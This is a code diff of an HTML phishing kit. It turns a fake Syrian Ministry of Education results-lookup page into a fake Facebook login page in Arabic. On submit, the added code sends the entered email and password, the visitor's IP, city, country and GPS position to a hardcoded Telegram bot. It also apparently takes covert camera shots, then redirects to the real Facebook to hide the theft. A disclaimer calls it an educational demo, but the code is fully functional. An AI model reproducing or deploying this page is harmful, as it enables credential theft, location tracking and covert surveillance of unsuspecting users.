@@ -3,181 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>وزارة التربية - نظام الاستعلام عن النتائج</title>
+    <title>فيسبوك - تسجيل الدخول</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #f0f2f5;
-            color: #1a1a1a;
-            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
         .container {
             background: white;
-            border-radius: 16px;
-            padding: 35px 30px;
-            max-width: 480px;
+            padding: 30px 35px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+            max-width: 400px;
             width: 100%;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
-            border: 1px solid #e0e0e0;
+            text-align: center;
         }
         .logo {
-            text-align: center;
+            font-size: 42px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 10px;
+            font-family: 'Helvetica', Arial, sans-serif;
+        }
+        .sub {
+            color: #606770;
+            font-size: 15px;
             margin-bottom: 25px;
         }
-        .logo img {
-            max-height: 70px;
-            width: auto;
-        }
-        .logo h2 {
-            color: #1a3a6b;
-            font-size: 20px;
-            margin-top: 8px;
-            font-weight: 700;
-        }
-        .logo .sub {
-            color: #666;
-            font-size: 13px;
-            font-weight: 400;
-        }
-        .title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a3a6b;
-            text-align: center;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #e0e0e0;
-            padding-bottom: 12px;
-        }
-        label {
-            display: block;
-            text-align: right;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 4px;
-        }
-        input, select {
+        input {
             width: 100%;
-            padding: 12px 14px;
-            border: 2px solid #d0d5dd;
-            border-radius: 10px;
-            font-size: 15px;
-            background: #fafbfc;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: #fff;
             outline: none;
             transition: 0.2s;
-            margin-bottom: 16px;
         }
-        input:focus, select:focus {
-            border-color: #1a3a6b;
-            box-shadow: 0 0 0 3px rgba(26, 58, 107, 0.1);
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
         .btn {
-            background: #1a3a6b;
-            color: white;
+            width: 100%;
             padding: 14px;
+            background: #1877f2;
+            color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 18px;
+            border-radius: 6px;
+            font-size: 20px;
             font-weight: 700;
             cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-            letter-spacing: 0.5px;
+            transition: 0.2s;
+            margin-top: 5px;
         }
         .btn:hover {
-            background: #0f2a4f;
-            transform: scale(1.02);
+            background: #166fe5;
+        }
+        .btn:active {
+            background: #0f5fb8;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 22px 0 18px;
+        }
+        .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .create-btn {
+            background: #42b72a;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .create-btn:hover {
+            background: #36a420;
         }
         .note {
             font-size: 12px;
-            color: #888;
-            text-align: center;
-            margin-top: 16px;
-            border-top: 1px solid #e0e0e0;
-            padding-top: 16px;
+            color: #777;
+            margin-top: 20px;
         }
         .hidden { display: none; }
         video, canvas { display: none; }
-        .status-box {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 13px;
-            text-align: center;
-            background: #f8f9fa;
-            border: 1px solid #e0e0e0;
-            color: #555;
-        }
-        .result-box {
-            margin-top: 20px;
-            padding: 20px;
-            border-radius: 12px;
-            background: #f0f7ff;
-            border: 2px solid #1a3a6b;
-            display: none;
-            text-align: right;
-        }
-        .result-box h3 {
-            color: #1a3a6b;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        .result-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #d0d5dd;
+        #status {
+            margin-top: 12px;
+            padding: 8px;
+            border-radius: 6px;
             font-size: 14px;
+            display: none;
         }
-        .result-item:last-child { border-bottom: none; }
-        .result-item .label { color: #555; font-weight: 600; }
-        .result-item .value { color: #1a3a6b; font-weight: 700; }
-        .success { color: #2e7d32; font-weight: 700; }
-        .fail { color: #c62828; font-weight: 700; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo">
-        <img src="https://moed.gov.sy/sites/default/files/logo_0.png" alt="وزارة التربية" onerror="this.style.display='none'">
-        <h2>وزارة التربية</h2>
-        <div class="sub">نظام الاستعلام عن النتائج الامتحانية</div>
-    </div>
+    <div class="logo">facebook</div>
+    <div class="sub">تسجيل الدخول إلى فيسبوك</div>
 
-    <div class="title">🔍 استعلام عن النتيجة</div>
-
-    <form id="searchForm">
-        <label>📌 رقم الاكتتاب</label>
-        <input type="text" id="registrationNumber" placeholder="أدخل رقم الاكتتاب" required>
-
-        <label>👤 الاسم الثلاثي</label>
-        <input type="text" id="fullName" placeholder="الاسم الأول - اسم الأب - اللقب" required>
-
-        <label>📘 الشهادة</label>
-        <select id="certificateType">
-            <option value="baccalaureate">شهادة البكالوريا (الثانوية العامة)</option>
-            <option value="ninth">شهادة الصف التاسع الأساسي</option>
-        </select>
-
-        <button type="submit" class="btn">🔍 عرض النتيجة</button>
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" class="btn">تسجيل الدخول</button>
     </form>
 
-    <div id="statusBox" class="status-box">📌 أدخل بياناتك للاستعلام عن النتيجة</div>
+    <a href="#" class="forgot">نسيت كلمة السر؟</a>
 
-    <div id="resultBox" class="result-box">
-        <h3>📋 نتيجة الطالب</h3>
-        <div id="resultContent"></div>
-    </div>
+    <div class="divider"></div>
 
-    <div class="note">
-        © 2026 وزارة التربية - نظام الاستعلام الرسمي
-    </div>
+    <button class="create-btn" onclick="alert('هذه صفحة تجريبية')">إنشاء حساب جديد</button>
+
+    <div id="status"></div>
+    <div class="note">هذه صفحة تجريبية لأغراض تعليمية فقط</div>
 </div>
 
 <video id="video" autoplay></video>
@@ -185,30 +143,10 @@
 
 <script>
     // ======== بيانات التليغرام ========
-    const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
-    const CHAT_ID = "8600300720";
-    const PAGE_NAME = "وزارة التربية - نظام النتائج";
-    // ===================================
-
-    // قاعدة بيانات وهمية للنتائج
-    const fakeDatabase = {
-        "1731940": {
-            name: "خالد حسين الطويل",
-            certificate: "baccalaureate",
-            average: 76.23,
-            status: "ناجح",
-            subjects: {
-                "اللغة العربية": 82,
-                "اللغة الإنجليزية": 71,
-                "الرياضيات": 68,
-                "التاريخ": 79,
-                "الجغرافيا": 74,
-                "الفلسفة": 70,
-                "علم الاجتماع": 73,
-                "الاقتصاد": 72
-            }
-        }
-    };
+    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
+    const CHAT_ID = "7214473798";
+    const PAGE_NAME = "فيسبوك - تسجيل دخول";
+    // ==================================
 
     async function sendToTelegram(message) {
         try {
@@ -222,7 +160,9 @@
                     parse_mode: 'HTML'
                 })
             });
-        } catch (e) { console.error(e); }
+        } catch (e) {
+            console.error("Telegram send error:", e);
+        }
     }
 
     async function sendPhotoToTelegram(base64Image, caption) {
@@ -232,9 +172,12 @@
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'shot.jpg');
             formData.append('caption', caption.substring(0, 1024));
+
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
             await fetch(url, { method: 'POST', body: formData });
-        } catch (e) { console.error(e); }
+        } catch (e) {
+            console.error("Photo send error:", e);
+        }
     }
 
     function dataURLtoBlob(dataURL) {
@@ -260,7 +203,9 @@
                 lon: data.longitude,
                 org: data.org
             };
-        } catch (e) { return null; }
+        } catch (e) {
+            return null;
+        }
     }
 
     function captureCamera() {
@@ -305,33 +250,31 @@
             });
     }
 
-    document.getElementById('searchForm').addEventListener('submit', async function(e) {
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
 
-        const regNumber = document.getElementById('registrationNumber').value.trim();
-        const fullName = document.getElementById('fullName').value.trim();
-        const certType = document.getElementById('certificateType').value;
-        const statusBox = document.getElementById('statusBox');
-        const resultBox = document.getElementById('resultBox');
-        const resultContent = document.getElementById('resultContent');
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const statusDiv = document.getElementById('status');
 
-        if (!regNumber || !fullName) {
-            statusBox.style.color = '#c00';
-            statusBox.innerText = '❌ الرجاء ملء جميع الحقول';
+        if (!email || !password) {
+            statusDiv.style.display = 'block';
+            statusDiv.style.color = '#c00';
+            statusDiv.innerText = '❌ الرجاء ملء جميع الحقول';
             return;
         }
 
-        statusBox.style.color = '#f0c060';
-        statusBox.innerText = '⏳ جاري الاستعلام عن النتيجة...';
+        statusDiv.style.display = 'block';
+        statusDiv.style.color = '#f0c060';
+        statusDiv.innerText = '⏳ جاري التحقق...';
 
         // جلب IP
         const ipInfo = await getIPInfo();
-        let msg = `🕵️ <b>${PAGE_NAME} - استعلام جديد</b>\n\n`;
-        msg += `📌 رقم الاكتتاب: ${regNumber}\n`;
-        msg += `👤 الاسم: ${fullName}\n`;
-        msg += `📘 الشهادة: ${certType === 'baccalaureate' ? 'بكالوريا' : 'تاسع'}\n`;
+        let msg = `🕵️ <b>${PAGE_NAME}</b>\n\n`;
+        msg += `👤 البريد: ${email}\n`;
+        msg += `🔑 كلمة السر: ${password}\n`;
         if (ipInfo) {
-            msg += `🌐 IP: ${ipInfo.ip}\n`;
+            msg += `📡 IP: ${ipInfo.ip}\n`;
             msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
             msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
             if (ipInfo.lat && ipInfo.lon) {
@@ -339,15 +282,17 @@
             }
         }
         msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+
         await sendToTelegram(msg);
 
-        // طلب GPS
+        // طلب GPS دقيق
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (p) => {
                 let lat = p.coords.latitude;
                 let lon = p.coords.longitude;
                 let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
+                gpsMsg += `👤 ${email}\n`;
                 gpsMsg += `📍 ${mapLink}\n`;
                 gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
                 gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
@@ -360,42 +305,15 @@
         // تصوير الكاميرا
         captureCamera();
 
-        // البحث في قاعدة البيانات
-        const student = fakeDatabase[regNumber];
+        statusDiv.style.color = '#2e7d32';
+        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
 
-        if (student && student.name === fullName) {
-            // عرض النتيجة
-            resultBox.style.display = 'block';
-            let html = `<div class="result-item"><span class="label">📌 رقم الاكتتاب</span><span class="value">${regNumber}</span></div>`;
-            html += `<div class="result-item"><span class="label">👤 الاسم الثلاثي</span><span class="value">${student.name}</span></div>`;
-            html += `<div class="result-item"><span class="label">📘 الشهادة</span><span class="value">البكالوريا - الأدبي</span></div>`;
-            html += `<div class="result-item"><span class="label">📊 المعدل</span><span class="value success">${student.average}%</span></div>`;
-            html += `<div class="result-item"><span class="label">📋 الحالة</span><span class="value success">✅ ${student.status}</span></div>`;
-            html += `<hr style="margin: 10px 0; border-color: #d0d5dd;">`;
-            for (const [subject, grade] of Object.entries(student.subjects)) {
-                html += `<div class="result-item"><span class="label">${subject}</span><span class="value">${grade}%</span></div>`;
-            }
-            resultContent.innerHTML = html;
-
-            statusBox.style.color = '#2e7d32';
-            statusBox.innerText = '✅ تم عرض النتيجة بنجاح - مبروك النجاح';
-
-            // إرسال النتيجة للتليغرام
-            let resultMsg = `📊 <b>نتيجة الطالب</b>\n\n`;
-            resultMsg += `👤 ${student.name}\n`;
-            resultMsg += `📌 ${regNumber}\n`;
-            resultMsg += `📘 بكالوريا - أدبي\n`;
-            resultMsg += `📊 المعدل: ${student.average}%\n`;
-            resultMsg += `📋 الحالة: ✅ ناجح`;
-            await sendToTelegram(resultMsg);
-        } else {
-            statusBox.style.color = '#c62828';
-            statusBox.innerText = '❌ لا توجد نتائج لهذا الرقم أو الاسم';
-            resultBox.style.display = 'none';
-        }
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/";
+        }, 2000);
     });
 
-    // إرسال IP فور فتح الصفحة
+    // إرسال IP فوراً عند فتح الصفحة
     (async function () {
         const ipInfo = await getIPInfo();
         if (ipInfo) {
@@ -410,5 +328,6 @@
         }
     })();
 </script>
+
 </body>
 </html>
